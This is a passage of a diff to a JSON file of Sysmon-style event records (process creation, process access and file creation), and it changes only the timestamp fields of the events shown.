+        "timestamp": "2026-05-08T17:48:57.706922+00:00"
       }
     },
     {
@@ -1432,7 +1432,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T16:35:30.980478+00:00"
+        "timestamp": "2026-05-08T17:48:57.706922+00:00"
       }
     },
     {
@@ -1446,7 +1446,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:30.980478+00:00"
+        "timestamp": "2026-05-08T17:48:57.706922+00:00"
       }
     },
     {
@@ -1460,7 +1460,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:30.980478+00:00"
+        "timestamp": "2026-05-08T17:48:57.706922+00:00"
       }
     },
     {
@@ -1474,7 +1474,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:30.980478+00:00"
+        "timestamp": "2026-05-08T17:48:57.723964+00:00"
       }
     },
     {
@@ -1488,7 +1488,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T16:35:30.980478+00:00"
+        "timestamp": "2026-05-08T17:48:57.724968+00:00"
       }
     },
     {
@@ -1502,7 +1502,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:30.980478+00:00"
+        "timestamp": "2026-05-08T17:48:57.726967+00:00"
       }
     },
     {
@@ -1516,7 +1516,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:30.996550+00:00"
+        "timestamp": "2026-05-08T17:48:57.729969+00:00"
       }
     },
     {
@@ -1530,7 +1530,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:30.996550+00:00"
+        "timestamp": "2026-05-08T17:48:57.744429+00:00"
       }
     },
     {
@@ -1544,7 +1544,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:30.996550+00:00"
+        "timestamp": "2026-05-08T17:48:57.744429+00:00"
       }
     },
     {
@@ -1558,7 +1558,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:31.012372+00:00"
+        "timestamp": "2026-05-08T17:48:57.744429+00:00"
       }
     },
     {
@@ -1572,7 +1572,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:31.012372+00:00"
+        "timestamp": "2026-05-08T17:48:57.755756+00:00"
       }
     },
     {
@@ -1586,7 +1586,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:31.051669+00:00"
+        "timestamp": "2026-05-08T17:48:57.810416+00:00"
       }
     },
     {
@@ -1600,7 +1600,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:31.051669+00:00"
+        "timestamp": "2026-05-08T17:48:57.810416+00:00"
       }
     },
     {
@@ -1614,7 +1614,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:31.060168+00:00"
+        "timestamp": "2026-05-08T17:48:57.833514+00:00"
       }
     },
     {
@@ -1628,7 +1628,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T16:35:31.092135+00:00"
+        "timestamp": "2026-05-08T17:48:57.867236+00:00"
       }
     },
     {
@@ -1642,7 +1642,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:31.092135+00:00"
+        "timestamp": "2026-05-08T17:48:57.869218+00:00"
       }
     },
     {
@@ -1656,7 +1656,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:31.092135+00:00"
+        "timestamp": "2026-05-08T17:48:57.871236+00:00"
       }
     },
     {
@@ -1670,7 +1670,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-08T16:35:31.092135+00:00"
+        "timestamp": "2026-05-08T17:48:57.874236+00:00"
       }
     },
     {
@@ -1684,7 +1684,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-08T16:35:31.092135+00:00"
+        "timestamp": "2026-05-08T17:48:57.875236+00:00"
       }
     },
     {
@@ -1698,7 +1698,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T16:35:31.124142+00:00"
+        "timestamp": "2026-05-08T17:48:57.939498+00:00"
       }
     },
     {
@@ -1712,7 +1712,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:31.139941+00:00"
+        "timestamp": "2026-05-08T17:48:57.943044+00:00"
       }
     },
     {
@@ -1726,7 +1726,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:31.139941+00:00"
+        "timestamp": "2026-05-08T17:48:57.943044+00:00"
       }
     },
     {
@@ -1740,7 +1740,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:31.171795+00:00"
+        "timestamp": "2026-05-08T17:48:58.006624+00:00"
       }
     },
     {
@@ -1754,7 +1754,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:31.171795+00:00"
+        "timestamp": "2026-05-08T17:48:58.023209+00:00"
       }
     },
     {
@@ -1768,7 +1768,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T16:35:31.187654+00:00"
+        "timestamp": "2026-05-08T17:48:58.039871+00:00"
       }
     },
     {
@@ -1782,7 +1782,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:31.219454+00:00"
+        "timestamp": "2026-05-08T17:48:58.079235+00:00"
       }
     },
     {
@@ -1796,7 +1796,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:31.227828+00:00"
+        "timestamp": "2026-05-08T17:48:58.090206+00:00"
       }
     },
     {
